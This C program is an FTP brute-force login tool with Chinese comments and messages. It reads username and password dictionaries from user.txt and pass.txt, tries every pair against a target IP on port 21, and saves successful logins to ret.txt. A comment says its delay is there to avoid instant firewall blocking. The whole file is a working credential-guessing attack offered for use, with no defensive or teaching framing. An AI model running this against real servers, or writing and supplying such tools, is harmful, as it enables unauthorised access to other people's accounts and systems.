#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <time.h>

#define BUFFER_SIZE 1024
#define FTP_PORT 21

// 函数声明
void read_file_lines(const char *filename, char lines[][BUFFER_SIZE], int *count);
int try_login(const char *ip, const char *user, const char *pass);
void remove_newline(char *str);

int main(int argc, char *argv[]) {
    // 检查参数：程序名 IP地址
    if (argc != 2) {
        fprintf(stderr, "用法: %s <目标FTP服务器IP>\n", argv[0]);
        exit(1);
    }

    const char *target_ip = argv[1];
    char users[100][BUFFER_SIZE]; // 假设最多100个用户
    char passes[100][BUFFER_SIZE]; // 假设最多100个密码
    int user_count = 0, pass_count = 0;

    // 1. 读取字典
    printf("[*] 正在加载字典...\n");
    read_file_lines("user.txt", users, &user_count);
    read_file_lines("pass.txt", passes, &pass_count);

    if (user_count == 0 || pass_count == 0) {
        printf("[-] 错误：字典文件为空或不存在。\n");
        return 1;
    }
    printf("[*] 加载了 %d 个用户名, %d 个密码。\n", user_count, pass_count);

    // 2. 打开结果文件
    FILE *fp_result = fopen("ret.txt", "w");
    if (!fp_result) {
        perror("无法打开 ret.txt");
        return 1;
    }

    // 3. 开始暴力破解循环
    printf("[*] 开始攻击 %s ...\n", target_ip);
    for (int i = 0; i < user_count; i++) {
        for (int j = 0; j < pass_count; j++) {
            printf("[*] 尝试: %s / %s ... ", users[i], passes[j]);
            
            // 调用登录尝试函数
            int result = try_login(target_ip, users[i], passes[j]);

            if (result == 1) {
                printf("成功!\n");
                // 写入结果文件
                fprintf(fp_result, "成功! IP:%s User:%s Pass:%s\n", target_ip, users[i], passes[j]);
                fflush(fp_result); // 立即写入磁盘
            } else {
                printf("失败\n");
            }
            
            // 简单的延时，避免网络拥堵或被防火墙瞬间封锁
            usleep(500000); // 0.5秒
        }
    }

    fclose(fp_result);
    printf("[*] 攻击结束，结果已保存至 ret.txt\n");
    return 0;
}

// 读取文件每一行到数组中
void read_file_lines(const char *filename, char lines[][BUFFER_SIZE], int *count) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        *count = 0;
        return;
    }
    while (fgets(lines[*count], BUFFER_SIZE, fp) != NULL) {
        remove_newline(lines[*count]);
        (*count)++;
    }
    fclose(fp);
}

// 去除字符串末尾的换行符
void remove_newline(char *str) {
    int len = strlen(str);
    if (len > 0 && (str[len-1] == '\n' || str[len-1] == '\r')) {
        str[len-1] = '\0';
    }
}

// 核心逻辑：建立连接并尝试登录
int try_login(const char *ip, const char *user, const char *pass) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);

    // 创建 TCP Socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;

    // 设置超时时间 (可选，防止卡死)
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(FTP_PORT);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    // 连接服务器
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return 0; // 连接失败
    }

    // 接收欢迎 Banner (220)
    if (recv(sock, buffer, BUFFER_SIZE, 0) <= 0) {
        close(sock);
        return 0;
    }
    memset(buffer, 0, BUFFER_SIZE);

    // 发送 USER 命令
    char cmd[BUFFER_SIZE];
    snprintf(cmd, sizeof(cmd), "USER %s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);

    // 接收响应 (通常是 331)
    if (recv(sock, buffer, BUFFER_SIZE, 0) <= 0) {
        close(sock);
        return 0;
    }
    
    // 检查是否要求输入密码 (331)
    // 有些服务器配置不同，可能直接返回错误，这里简化处理
    if (strstr(buffer, "331") == NULL) {
         close(sock);
         return 0; 
    }
    memset(buffer, 0, BUFFER_SIZE);

    // 发送 PASS 命令
    snprintf(cmd, sizeof(cmd), "PASS %s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);

    // 接收最终结果
    if (recv(sock, buffer, BUFFER_SIZE, 0) <= 0) {
        close(sock);
        return 0;
    }

    close(sock);

    // 检查是否包含 "230 Login successful"
    if (strstr(buffer, "230") != NULL) {
        return 1; // 成功
    }

    return 0; // 失败
}